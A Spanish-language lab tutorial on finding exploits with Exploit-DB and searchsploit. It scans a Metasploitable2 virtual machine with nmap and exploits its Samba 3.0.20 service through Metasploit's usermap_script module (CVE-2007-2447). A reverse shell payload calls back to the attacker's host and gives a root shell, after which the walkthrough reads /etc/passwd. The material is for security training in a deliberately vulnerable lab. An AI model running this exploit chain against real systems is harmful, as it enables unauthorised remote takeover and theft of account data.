# Buscador de Vulnerabilidades y Exploits

La ciberseguridad se vuelve mucho mejor cuando se unen las personas y las organizaciones encontrando vulnerabilidades en un sistema u otro, reportandolo en bases de datos para que los profesionales de informática los tengan en cuenta. Esto es el _modus operandi_ de la ciberseguridad hoy, y vamos a ver fuentes confiables de vulnerabilidades y exploits a fin de tener un punto de partida.

## Vía Web = Exploit-DB

_URL_
**https://www.exploit-db.com/**

Es una base de datos pública y de código abierto de exploits, vulnerabilidades y herramientas de seguridad. Es mantenida por Offensive Security y se utiliza para documentar y compartir información sobre diferentes exploit que pueden ser usados para validar la existencia de vulnerabilidades de seguridad en sistemas y aplicaciones.

### Uso

1. Entra a la URL de Exploit-DB y aparece en el _Home_ una tabla con un listado de vulnerabilidades, versiones de sistemas y más. Encima de la tabla, hay una barra simple de búsqueda. Escribe _ssh_ y vemos los resultados.
2. Haz clic en la primera fila, en la ficha vemos los detalles de la vulnerabilidad:

- Título de la vulnerabilidad.
- EDB-ID: Identificador en la base de datos de Exploit DB.
- CVE: Código Único para identificar la vulnerabilidad.
- Autor: Quién descubrió la vulnerabilidad.
- Tipo.
- Plataforma (Windows, SOs basados en Linux, etcétera).
- Fecha de descubrimiento/registro.
- Aplicación vulnerable (si la hay).
- EDB Verified: Si el equipo de Offensive Security ha comprobado la vulnerabilidad.
- Exploit: Es el código que es la Prueba de Concepto (PoC) o un exploit como prueba de la vulnerabilidad. Se puede copiar o descargar.

> Nota: La razón por la que pongo _SOs basados en Linux_ es debido a que _Linux_ **no es un sistema operativo como tal**, es una parte de, el **kernel**, la interfaz entre el hardware y el software, permitiendo que las aplicaciones y los usuarios interactúen con la computadora. Para acortar las referencias, los sitios ponen _Linux_ para englobar a los SOs que tienen ese kernel.

## Vía Consola = Searchsploit

Para tener acceso desde la terminal a la base de datos de Exploit-DB, tenemos el paquete _searchsploit_, vamos a instalarla:

```sh
$> sudo apt update && sudo apt -y install exploitdb
```

> Nota: En Kali Linux ya lo tiene preinstalado.

## Uso de Searchsploit

1. Ejecuta el comando _searchsploit_, te aparecerán las opciones para su uso:

```sh
$> searchsploit
```

2. Vamos a escanear al host de _Metasploitable2_ los puertos 139 y 445, con el fin de usar la información de Searchsploit + el reporte del escaneo de _nmap_ para aprender a atacar a la víctima:

```sh
$> nmap -p 139,445 -sC -sV ms2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 15:33 EDT
Nmap scan report for ms2 (10.0.2.5)
Host is up (0.0014s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:DE:69:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-06-12T15:34:00-04:00
|_clock-skew: mean: 2h00m02s, deviation: 2h49m42s, median: 2s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

¿Qué es Samba? Es un software que implementa el protocolo SMB (Server Message Block), que es el que utilizan los sistemas Windows para la comunicación en red. Samba permite a los sistemas Linux y Unix actuar como servidores de archivos, impresoras y como controladores de dominio de Active Directory, que es el servicio de directorio, desarrollado por Microsoft, que centraliza la gestión de usuarios, equipos, grupos y otros recursos de red en un entorno Windows. Parece ser que _Metasploitable2_ forma parte de una red multiplataforma.

> Nota: Hay una diferencia entre uso del puerto 139 y 445. El 139 fue basado en NetBIOS, "Network Basic Input/Output System", protocolo de red que se utiliza para la comunicación entre computadoras en redes locales Windows _sin salida a internet_, mientras que el 445 se basó en TCP/IP.

3. Ahora, vamos a buscar si en Exploit-DB se encuentran vulnerabilidades, exploits e información para el software y la versión que encontramos, _samba 3.0.20_:

```sh
$> searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                   | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Los resultados siempre van a tener variedad de tipos, como información (la primera y la tercera), pruebas de concepto (la última) y _command execution_. Este último son los que nos interesan para verificar si hay una herramienta en _Metasploit_ que nos pueda apoyar a atacar la vulnerabilidad.

> Nota: Para filtrar los resultados por palabras clave, ejecuta el mismo comando con la opción _--exclude_: _searchsploit samba 3.0.20 --exclude="Denial of Service"_, y ahora aparecerán 3 resultados, no saliendo el último por contener el filtro (_Samba < 3.6.2 (x86) - **Denial of Service** (PoC)_)
> Nota: Para ver las URL de Exploit-DB en lugar de la columna _path_ (ruta), usa la opción _-w_.
> Nota: Hay una opción exclusiva para _nmap_, _--nmap [archivo.xml]_, busca todas las vulnerabilidades en un escaneo de versiones de servicios de _nmap_ guardado en _archivo.xml_. Para guardar una salida de _nmap_: _nmap [host] -sV -oX archivo.xml_.

4. Para entrar y ver el contenido de una de las opción, ejecutamos _searchsploit -x_ con el valor de la columna **Path**, vamos a ver el que contiene la palabra _(Metasploit)_:

```sh
$> searchsploit -x unix/remote/16320.rb
```

Se abre el contenido del script, para salir teclea _q_, y el comando termina con un resumen acerca del archivo, con los datos descritos en una ficha de Exploit-DB (Uso > Punto 2).

5. Para copiar el archivo seleccionado al directorio actual, usar la opción _-m_:

```sh
$> searchploit -m unix/remote/16320.rb
$> head unix/remote/16320.rb
(Se verá el inicio del archivo en tu Kali Linux)
...
```

> Nota: _head_ es el comando para ver el inicio de los archivos sin necesidad de verlo todo (_cat_ hace eso).
> Nota: El archivo no necesita permisos especiales porque es una copia local desde la base de datos estática de searchsploit.

6. Ahora lee el archivo hasta la parte de **CVE** con _cat_ o _less_ (o cualquier otra forma de leer el archivo), vamos a copiarlo, será la llave de búsqueda en _Metasploit_:

```sh
$> cat 16320.rb
...
'Author'         => [ 'jduck' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 10040 $',
'References'     =>
        [
                [ 'CVE', '2007-2447' ],
                [ 'OSVDB', '34700' ],
                [ 'BID', '23972' ],
                [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
                [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
        ],
'Platform'       => ['unix'],
'Arch'           => ARCH_CMD,
...
```

El dato es _2007-2447_.

> Nota: No es necesario "descargar" el archivo, recuerda que con _searchsploit -x [path_al_archivo]_ puedes ver el contenido.

7. Iniciamos _Metasploit_ y buscamos con el comando _search_ el CVE y luego usamos el módulo:

```sh
msf6 > search 2007-2447

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > 
```

8. Ahora mostramos las opciones de configuración antes de ejecutar el exploit, notaremos algo en las opciones del _payload_, la palabra _reverse_; cuando un _payload_ es del tipo _reverse_, el ataque lo hace ejecutando un comando _desde el host víctima a nuestro Kali Linux_:

```sh
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-me
                                       tasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

9. Vamos establecer la opción _RHOSTS (ms2)_ y vamos a cambiar el payload con el comando _set payload_ a _cmd/unix/reverse_,  como alternativa para usar otro payload y así practica el comando:

```sh
msf6 exploit(multi/samba/usermap_script) > set rhosts ms2
rhosts => ms2
msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
```

> Nota: La opción del payload _LHOST_ es puesta a nuestra IP de nuestro host por defecto, si no es así, establécelo con _set LHOST  NUEVAIP_. Puede que cuando cambiamos un payload por otro, las opciones cambiemos también de nombre, en este ejemplo son iguales.

10. Ejecutamos el exploit, y con éxito tenemos un shell de _Metasploitable2_. Ahora vamos a poner un ejemplo de por qué esto es CAÓTICO para un sistema que se encuentra desarrollado un exploit para un puerto. Ejecutamos los comandos para ver a los usuarios y sus _contraseñas_ en el sistema y nombre de la máquina:

- _/etc/passwd_: Este archivo contiene la información básica de cada cuenta de usuario en el sistema. Es legible por todos los usuarios, pero normalmente **no contiene las contraseñas reales**, ya que estas se almacenan en `/etc/shadow` con formato de **hash** (un código para ocultar las contraseñas) que **sólo el usuario root puede leer**: usuario:contraseña:UID:GID:comentario:directorio_home:shell.

- _/etc/hostname_: Este archivo contiene una sola línea con el **nombre del host** del sistema (hostname). Este nombre es cómo se identifica tu máquina en la red local.

```sh
msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP double handler on 10.0.2.15:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo p7foJTiWnUM3CxiX;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "p7foJTiWnUM3CxiX\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.5:33250) at 2025-06-13 23:09:32 -0400

cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
cat /etc/hostname
metasploitable
whoami
root
```

## Reflexión Final

Este ejercicio demuestra cómo una vulnerabilidad en un servicio expuesto, como Samba, puede dar control total a un atacante. Por eso es crítico:

- Mantener el software actualizado.
- Cerrar puertos innecesarios.
- Realizar escaneos periódicos.
- Limitar el acceso mediante firewalls y redes segmentadas.

_**Ahora si, ¿Ya ves por qué debemos configurar nuestros hosts de manera segura con actualizaciones de los softwares de los puertos?**_.

**Tabla de comando de la lección.**

| Comando                          | Descripción                                         |
|----------------------------------|-----------------------------------------------------|
| `searchsploit [término]`         | Búsqueda simple                                     |
| `searchsploit -x [ruta]`         | Mostrar contenido del exploit                      |
| `searchsploit -m [ruta]`         | Copiar el archivo al directorio actual             |
| `searchsploit --exclude=“...”`   | Excluir resultados por palabra clave               |
| `searchsploit -w`                | Mostrar URLs en lugar de rutas locales             |
| `searchsploit --nmap archivo.xml`| Analizar salida XML de escaneo Nmap                |
